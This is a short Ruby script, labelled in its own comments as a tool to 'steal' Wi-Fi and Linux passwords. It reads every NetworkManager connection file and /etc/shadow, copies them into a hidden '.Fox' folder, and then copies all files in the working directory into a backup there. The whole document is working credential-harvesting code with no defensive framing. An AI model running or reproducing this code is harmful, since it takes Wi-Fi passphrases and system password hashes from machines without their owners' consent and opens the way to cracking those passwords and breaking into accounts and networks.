require 'fileutils'

### Steal WIFI Password On Linux ###
files = Dir.entries('/etc/NetworkManager/system-connections/').select do |f|
  File.file? File.join('/etc/NetworkManager/system-connections/', f)
end
Dir.mkdir('.Fox')
num = 1
files.each do |line|
  data_read = File.read("/etc/NetworkManager/system-connections/#{line}")
  File.open(".Fox/WIFI-#{num}.txt", 'w') do |word|
    word.puts data_read
  end
  num += 1
end

### Steal Linux Password ###
os_pass = File.read('/etc/shadow')
File.open('.Fox/OS_Pass.txt', 'w') do |line|
  line.puts os_pass
end

### Take Backup ###
Dir.mkdir('.Fox/BackUP')
data_dir = Dir.entries('.').select { |f| File.directory? File.join('.', f) }
data_dir.each do |dir|
  case dir
  when '.', '..', '.Fox'
    next
  else
    FileUtils.copy_entry dir, '.Fox/BackUP'
  end
end
data_file = Dir.entries('.').select { |f| File.file? File.join('.', f) }
data_file.each do |file|
  next if file == __FILE__

  FileUtils.cp file, '.Fox/BackUP'
end
